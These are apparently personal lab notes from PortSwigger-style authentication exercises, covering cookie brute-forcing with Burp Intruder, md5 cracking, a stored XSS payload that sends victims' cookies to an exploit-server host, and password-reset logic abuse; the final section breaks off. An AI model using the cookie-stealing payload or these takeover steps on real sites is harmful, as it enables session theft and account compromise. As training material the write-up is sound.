# AUTHENTICATION VULNERABILITIES

---

<img width="1057" height="258" alt="image" src="https://github.com/user-attachments/assets/e61107a1-529a-4e90-8595-181414b6ed84" />


<img width="1038" height="312" alt="image" src="https://github.com/user-attachments/assets/d16cfa80-59c1-498e-b2c7-c4c44fda17e3" />


<img width="1029" height="299" alt="image" src="https://github.com/user-attachments/assets/99bfb7ad-75dd-4aab-a64e-555bb4fb3f47" />


//Lab: Brute-forcing a stay-logged-in cookie

- log in as wiener:peter with stay logged in box checked
- notice we'd get the stay-logged-in cookie
- notice it looks base64 encoded -- use decoder and found that it's `wiener:<hash>`
- the hash looks like md5 -- try and crack it on crackstation and yes it's md5 `peter`
- so: `base64(<user> : <md5hash>)`
- on burp send /login request to intruder
- change id to carlos -- set password as target param --  paste payload list
- set payload processing accordingly and sequentially -- 1. hash md5 -- 2. add prefix carlos: -- 3. base64 encode
- then we get 200 OK on the successful login attempt

---

<img width="1081" height="172" alt="image" src="https://github.com/user-attachments/assets/ca22ae63-b8b8-4984-ba17-7d2068f7b138" />


//Lab: Offline password cracking


- try XSS on the comment form
- try this payload with the url of our exploit server

```
<script>document.location='https://exploit-0a1b008404dfb351808e029001800001.exploit-server.net/'+document.cookie</script>
```

- and got a hit on our exploit server log
  
<img width="1536" height="432" alt="image" src="https://github.com/user-attachments/assets/ca8052f0-4816-4e96-834d-bfd78f030b96" />

- use burp decoder

<img width="684" height="277" alt="image" src="https://github.com/user-attachments/assets/3bccf8a5-9fed-48f3-8c56-eabbf618606e" />

- then crack the hash on crackstation.net

<img width="966" height="279" alt="image" src="https://github.com/user-attachments/assets/24eab12c-7011-4880-a123-84bef77c08bb" />

- then login with `carlos : onceuponatime`
- and delete account

---


<img width="1010" height="256" alt="image" src="https://github.com/user-attachments/assets/c93694ba-76f5-4423-969f-773c5fed44c3" />


<img width="1086" height="300" alt="image" src="https://github.com/user-attachments/assets/d34ce0eb-1821-410a-9f37-0d937786b0cd" />


<img width="1071" height="278" alt="image" src="https://github.com/user-attachments/assets/e04560b2-576e-41a8-82b8-897ecb64e240" />


<img width="1115" height="346" alt="image" src="https://github.com/user-attachments/assets/7d296399-890f-4cdc-b0f0-8855ca78b7c7" />


//Lab -- password reset broken logic

- check our email for our exploit server

`wiener@exploit-0a43002f034e9138805dc09f01e60087.exploit-server.net`

- now click on `forget password` and type in our email
- in our email client we get an email with a link to reset password
- try and reset our password
- it redirects
- try and log in with our new password and it works

<img width="928" height="417" alt="image" src="https://github.com/user-attachments/assets/668efed3-84c4-400b-8804-4cfc56779a18" />


- now from the earlier POST request `/forgot-password?temp-forgot-password-token=30lrllg39e1avwc5wgds6dylu45q5j7ua`
- swap in our new password and username carlos
- it redirects
<img width="989" height="431" alt="image" src="https://github.com/user-attachments/assets/d26d56a4-d265-4975-8b06-521a1c76f196" />


- log in with `carlos : tools`
- and lab solved

<img width="1180" height="662" alt="image" src="https://github.com/user-attachments/assets/a5f40130-300d-43bd-9b6a-4ca6d3746ede" />


---

<img width="1010" height="151" alt="image" src="https://github.com/user-attachments/assets/db43c8e8-f08a-47b0-8ccb-91c9cb618778" />



//Lab -- password reset poisoning via middleware




wiener@exploit-0ac900a503d5471c80df709101f000bb.exploit-server.net


































